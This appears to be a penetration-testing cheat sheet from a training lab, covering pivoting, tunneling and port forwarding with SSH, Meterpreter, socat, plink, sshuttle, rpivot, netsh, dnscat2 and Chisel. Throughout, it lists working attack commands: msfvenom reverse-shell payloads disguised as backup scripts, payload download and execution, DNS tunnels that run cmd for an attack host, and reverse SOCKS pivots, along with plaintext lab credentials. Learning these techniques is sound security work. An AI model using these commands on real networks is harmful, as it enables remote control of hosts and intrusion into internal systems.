# Pivoting Tunneling Port-Forwarding

### Basics

```shell
  ifconfig #linux
  netstat -r

  ipconfig #windows
```

---

### Dynamic Port Forwarding with SSH and SOCKS Tunneling

```shell
  nmap -sT -p22,3306 10.129.202.64

  ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
  
  #Check if the port forwarding is successful
  netstat -antp | grep 1234
  nmap -v -sV -p1234 localhost

  #Forwarding multiple ports
  ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
  ifconfig

  #Dynamic Port Forwarding
  ssh -D 9050 ubuntu@10.129.202.64 #from attacker machine to target ip 
  tail -4 /etc/proxychains.conf

  proxychains nmap -v -sn 172.16.5.1-200
  proxychains nmap -v -Pn -sT 172.16.5.19
  
```

---

### Remote / Reverse Port Forwarding with SSH

```shell
  msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
  use exploit/multi/handler
  
  scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
  python3 -m http.server 8123
  Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
  
  ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

---

### Meterpreter Tunneling & Port Forwarding

```shell
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
  use exploit/multi/handler

  msfconsole -q
  use exploit/multi/handler
  set payload linux/x64/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT PWNPO
  run

  # On the target host
  chmod +x backupjob 
  ./backupjob

  bg
  use auxiliary/server/socks_proxy
  set SRVPORT 9050
  set SRVHOST 0.0.0.0
  set VERSION 4a
  run

  run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
  for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
  1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"} # Powershell

  use auxiliary/server/socks_proxy
  jobs
  use post/multi/manage/autoroute
  set SESSION 1
  set SUBNET 172.16.5.0
  run autoroute -s 172.16.5.0/23

  portfwd add -l 3300 -p 3389 -r 172.16.5.19
  portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

  
```

---

### Socat

```shell
  socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
  
  sudo msfconsole
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_https
  set lhost 0.0.0.0
  set lport 80
  run

  getuid

  #Bind
  sudo msfconsole
  use exploit/multi/handler
  set payload windows/x64/meterpreter/bind_tcp
  set rhost <ip>
  set lhost 0.0.0.0
  set lport 8080
  run
  
```

---

### SSH for Windows / plink.exe

```shell
  plink -ssh -D 9050 ubuntu@10.129.15.50
```

---

### SSH Pivoting with Sshuttle

```shell
  sudo apt-get install sshuttle
  sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
  nmap -v -sV -p3389 172.16.5.19 -A -Pn
```

---

### Web Server Pivoting with Rpivot

```shell
  git clone https://github.com/klsecservices/rpivot.git
  sudo apt-get install python2.7
  python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0 # attack host
  scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/ # trabsferring to target
  python2.7 client.py --server-ip 10.10.14.18 --server-port 9999 #running from client
  proxychains firefox-esr 172.16.5.135:80
  python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
  
```

---

### Port Forwarding with Windows Netsh

```shell
  netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
  netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=<target_ip> connectport=3389 connectaddress=<inside_network_address>
  xfreerdp /v:<ip>:8080 /u:<username> /p:<password>
  netsh.exe interface portproxy show v4tov4
```

---

### DNS Tunneling  with dnscat2

```shell
  # On the attackbox
  git clone https://github.com/iagox86/dnscat2.git
  sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

  # On the target machine
  git clone https://github.com/lukebaggett/dnscat2-powershell.git
  Import-Module .\dnscat2.ps1
  Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

  ?
  window -i 1
  
```

---

### Socks5 Tunneling with Chisel

```shell
  git clone https://github.com/jpillora/chisel.git
  cd chisel
  go build

  wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
  scp chisel ubuntu@10.129.202.64:~/
  ./chisel_1.7.6_linux_amd64 server -v -p 9001 --socks5
  ./chisel server -v -p 1234 --socks5 # on attack machine
  ./chisel client -v 10.129.202.64:1234 socks # on target machine
  ./chisel_1.7.6_linux_amd64 client -v 10.129.202.64:1234 socks # on target machine

  tail -f /etc/proxychains.conf
  proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

  # Reverse pivot
  sudo ./chisel server --reverse -v -p 1234 --socks5 # on attack host
  ./chisel client -v 10.10.14.17:1234 R:socks # on target host

  
  
```
